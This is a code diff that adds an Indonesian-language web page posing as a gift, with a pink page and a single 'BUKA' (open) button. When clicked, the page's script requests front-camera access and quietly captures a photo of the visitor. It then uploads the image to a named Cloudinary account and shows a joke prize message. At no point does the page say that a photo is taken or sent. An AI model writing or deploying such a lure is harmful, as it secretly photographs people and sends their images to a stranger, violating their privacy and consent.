@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Hadiah untukmu</title>
+  <style>
+    body {
+      background-color: pink;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      font-family: sans-serif;
+    }
+    #bukaBtn {
+      padding: 15px 30px;
+      font-size: 24px;
+      background-color: maroon;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    #result {
+      display: none;
+      color: maroon;
+      font-size: 28px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <button id="bukaBtn">BUKA</button>
+  <div id="result">Sayang sekali. Anda tidak beruntung</div>
+
+  <script>
+    const bukaBtn = document.getElementById("bukaBtn");
+    const result = document.getElementById("result");
+
+    bukaBtn.addEventListener("click", async () => {
+      try {
+        // Akses kamera depan
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false
+        });
+
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
+
+        // Tunggu kamera nyala lalu ambil gambar
+        await new Promise(resolve => setTimeout(resolve, 1000));
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0);
+
+        // Hentikan kamera
+        stream.getTracks().forEach(track => track.stop());
+
+        // Convert gambar ke base64
+        const imageData = canvas.toDataURL("image/jpeg");
+
+        // Upload ke Cloudinary
+        const data = new FormData();
+        data.append("file", imageData);
+        data.append("upload_preset", "Foto-auto"); // Ganti dengan upload preset
+        data.append("cloud_name", "docghkb28"); // Ganti dengan cloud name kamu
+
+        await fetch("https://api.cloudinary.com/v1_1/docghkb28/image/upload", {
+          method: "POST",
+          body: data
+        });
+
+        // Ganti tampilan
+        document.body.innerHTML = `<div id="result">Selamat anda mendapatkan 1 perak🗿</div>`;
+        document.body.style.backgroundColor = "pink";
+        document.getElementById("result").style.color = "maroon";
+        document.getElementById("result").style.display = "flex";
+        document.getElementById("result").style.justifyContent = "center";
+        document.getElementById("result").style.alignItems = "center";
+        document.getElementById("result").style.height = "100vh";
+      } catch (err) {
+        alert("Sayang sekali. Tidak bisa mendapatkan hadiah");
+      }
+    });
+  </script>
+</body>
+  </html>
